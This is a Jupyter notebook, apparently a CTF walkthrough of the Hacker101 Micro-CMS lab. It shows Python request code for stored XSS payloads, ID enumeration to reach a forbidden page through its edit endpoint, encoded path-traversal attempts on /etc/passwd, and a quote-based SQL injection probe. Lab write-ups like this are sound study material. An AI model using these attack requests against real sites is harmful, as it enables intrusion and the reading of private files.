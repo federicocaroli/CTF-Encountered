{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests, time\n",
    "\n",
    "url = \"https://a56773d9469f374124482238bda0a326.ctf.hacker101.com/\" # Home page\n",
    "\n",
    "session = requests.Session()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get the homepage"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url)\n",
    "print(response.text)\n",
    "\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\">Testing</a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I try to access the \"Testing page\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"page/1\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Testing</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/1\">Edit this page</a>\n",
    "        <h1>Testing</h1>\n",
    "<h1>Woo</h1>\n",
    "<p>Testing out this new micro-CMS!</p>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I am able to edit the page's content. I try to inject a script tag both in the title and the body -> **Stored XSS**\n",
    "\n",
    "New title: ```<script>alert(1);</script>```\n",
    "New body: ```<script>alert(2);</script>```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url + \"page/edit/1\", data= {\"title\": \"<script>alert(1);</script>\", \"body\": \"<script>alert(2);</script>\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = requests.get(url + \"page/1\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>&lt;script&gt;alert(1);&lt;/script&gt;</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/1\">Edit this page</a>\n",
    "        <h1>&lt;script&gt;alert(1);&lt;/script&gt;</h1>\n",
    "\t<scrubbed>alert(2);</scrubbed>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Unluckily, the injected code has not been executed in the \"/page/1\". However, even if the body has been correctly sanitized, the title still contains the encoded versions of < >. So, the < > are still there, but in a different format. Moreover, I can see through DevTools that the web site does not include any CSP directive.\n",
    "\n",
    "I want to try what is going to be showed in the homepage (considering that I changed the title of the testing page)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url)\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\"><script>alert(\"^FLAG^...$FLAG$\");</script><script>alert(1);</script></a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "## YES! The sanitation of the homepage is not implemented! One flag caught!\n",
    "\n",
    "Now, I need to look for the remaining 3 flags...\n",
    "\n",
    "I am going to use the functionality of creating pages to see what will happen.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url + \"page/create\", data= {\"title\": \"a\", \"body\": \"b\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = session.get(url)\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The home page has been changed in this way:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\"><script>alert(\"^FLAG^eeed36e5fdc5a8d74ffa3742142f7a42f6374ed2ea9c5e454419189b643b41a5$FLAG$\");</script><script>alert(1);</script></a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "<li><a href=\"page/7\">a</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```html\n",
    "\n",
    "Why the new ID is 7 and not 3? I am going to try to access the pages related to IDs 3, 4, 5, 6."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(3, 7):\n",
    "\tprint(f\"Requesting page {i}...\")\n",
    "\tresponse = session.get(url + \"page/\" + str(i))\n",
    "\tprint(f\"Response status code: {response.status_code}. Response text: {response.text}\")\n",
    "\ttime.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The various responses follow:\n",
    "```html\n",
    "Requesting page 3...\n",
    "Response status code: 404. Response text: <!doctype html>\n",
    "<html lang=en>\n",
    "<title>404 Not Found</title>\n",
    "<h1>Not Found</h1>\n",
    "<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
    "\n",
    "Requesting page 4...\n",
    "Response status code: 404. Response text: <!doctype html>\n",
    "<html lang=en>\n",
    "<title>404 Not Found</title>\n",
    "<h1>Not Found</h1>\n",
    "<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
    "\n",
    "Requesting page 5...\n",
    "Response status code: 403. Response text: <!doctype html>\n",
    "<html lang=en>\n",
    "<title>403 Forbidden</title>\n",
    "<h1>Forbidden</h1>\n",
    "<p>You don&#39;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>\n",
    "\n",
    "Requesting page 6...\n",
    "Response status code: 404. Response text: <!doctype html>\n",
    "<html lang=en>\n",
    "<title>404 Not Found</title>\n",
    "<h1>Not Found</h1>\n",
    "<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
    "```\n",
    "\n",
    "The response for page 5 is different from the others... **It says that I cannot access the resource, but something exists!**\n",
    "Maybe I cannot read the page, but still modify it?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"page/edit/5\")\n",
    "print(f\"Response text: {response.text}\")\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Edit page</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../../\">&lt;-- Go Home</a>\n",
    "        <h1>Edit Page</h1>\n",
    "        <form method=\"POST\">\n",
    "            Title: <input type=\"text\" name=\"title\" value=\"Private Page\"><br>\n",
    "            <textarea name=\"body\" rows=\"10\" cols=\"80\">My secret is ^FLAG^...$FLAG$</textarea><br>\n",
    "            <input type=\"submit\" value=\"Save\">\n",
    "            <div style=\"font-style: italic\"><a href=\"https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet\">Markdown</a> is supported, but scripts are not</div>\n",
    "        </form>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "## BOOM! Second flag caught! There are sill 2 flags to catch!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To simplify the visualization of the website from the browser, I am going to change again the title of Page 1."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.post(url + \"page/edit/1\", data= {\"title\": \"Test\", \"body\": \"<script>alert(2);</script>\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = requests.get(url)\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "New homepage:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\">Test</a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "<li><a href=\"page/7\">a</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Now I don't have any clue on what I should do... However, I have seen that the page 2 includes a button... maybe I can exploit the button tag to execute XSS? Well, I could simply try to introduce inline JavaScript code in any event handler... -> **Stored XSS**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"page/2\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Page 2's content:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Markdown Test</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/2\">Edit this page</a>\n",
    "        <h1>Markdown Test</h1>\n",
    "<p>Just testing some markdown functionality.</p>\n",
    "<p><img alt=\"adorable kitten\" src=\"https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/\" /></p>\n",
    "<p><button>Some button</button></p>\n",
    "    </body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "response = session.post(url + \"page/edit/7\", data= {\"title\": \"DaiDai\", \"body\": '<button onclick=\"alert(1);\">c</button>'}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = session.get(url + \"page/7\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The new content for page 7 is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>DaiDai</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/7\">Edit this page</a>\n",
    "        <h1>DaiDai</h1>\n",
    "<p><button flag=\"^FLAG^...$FLAG$\" onclick=\"alert(1);\">c</button></p>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "## Good! New flag found! Only 1 undiscovered flag is left!\n",
    "\n",
    "After some time spent doing brainstorming on the webiste, I think that the last flag is hidden somewhere in a file accessible by taking advantage of a **Path-Traversal-related vulnerability**.\\\n",
    "I tried to use an online free URL fuzzer on the endpoint ```url/``` and ```url/page/```, but it did not find out anything.\\\n",
    "Now, I want to inspect how the website manages the ```../```."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"../../etc/passwd\")\n",
    "print(response.url)\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = session.get(url + \"page/%2e%2e/%2e%2e/etc/passwd\")\n",
    "print(response.url)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is very interesting to see how the website sanitizes the url path by removing ```../``` but not the ```%2e%2e/```. Maybe I can exploit it?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"%2e%2e/%2e%2e/etc/passwd\")\n",
    "print(response.text)\n",
    "print(response.url)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I tried multiple different paths but none worked.\n",
    "The same response:\n",
    "```html\n",
    "<html>\n",
    "<head><title>400 Bad Request</title></head>\n",
    "<body>\n",
    "<center><h1>400 Bad Request</h1></center>\n",
    "</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    " I think that maybe it is not the right attack... I am going to use the hint provided by hacker101 platform... Hint: Have you tested for the usual culprits? XSS, SQL injection, path injection\\\n",
    " Now I want to consider the SQL injection attack. I thought pages were stored directly into files, but maybe their content may be retrieved from DB by using the ID as unique key..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"page/edit/1'\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is directly the last flag:\n",
    "```html\n",
    "^FLAG^...$FLAG$\n",
    "```\n",
    "\n",
    "## Last flag caught!\n",
    "\n",
    "It has been complex to find this last flag!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "microlog",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
